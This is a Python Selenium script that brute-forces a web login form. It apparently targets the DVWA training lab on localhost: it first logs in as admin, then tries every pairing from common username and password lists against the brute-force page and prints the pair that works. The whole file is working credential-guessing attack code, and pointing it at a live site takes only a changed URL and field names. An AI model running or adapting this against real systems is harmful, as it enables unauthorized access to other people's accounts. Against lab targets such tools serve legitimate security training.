import requests as req
import selenium.webdriver as webdriver
from pathlib import Path

def get_common_user_data(usernames_path: Path, passwords_path: Path) -> tuple[list[str], list[str]]:
    with open(usernames_path) as file:
        usernames = file.readlines()
    
    with open(passwords_path) as file:
        passwords = file.readlines()
        
    return usernames, passwords

def update_page_with_data(driver, url: str, username: str, password: str) -> None:
    driver.get(url)
    user_element = driver.find_element_by_css_selector('input[name="username"]')
    user_element.send_keys(username)

    passwd_element = driver.find_element_by_css_selector('input[name="password"]')
    passwd_element.send_keys(password)

    driver.find_element_by_css_selector('input[name="Login"]').click()
    
def brute_site_by_data(driver, usernames: list[str], passwords: list[str]) -> None:
    for username in usernames:
        for password in passwords:
            current_url = 'http://127.0.0.1/vulnerabilities/brute'
            update_page_with_data(driver, current_url, username, password)
            if 'Welcome to the password protected area admin' in driver.page_source:
                print(f'Login: {username} Password: {password}')
                return
    print('Brute failed')
    return
    

if __name__ == '__main__':
    driver_path = Path(__file__).parent / 'selenium_drivers' / 'geckodriver.exe'
    driver = webdriver.Firefox(executable_path=driver_path)
    
    current_url = 'http://127.0.0.1/login.php'
    username = 'admin'
    password = 'password'
    update_page_with_data(driver, current_url, username, password)

    usernames_path = Path(__file__).parent / 'common_usernames.txt'
    passwords_path = Path(__file__).parent / 'common_passwords.txt'
    usernames, passwords = get_common_user_data(usernames_path, passwords_path)
    brute_site_by_data(driver, usernames, passwords)

    driver.close()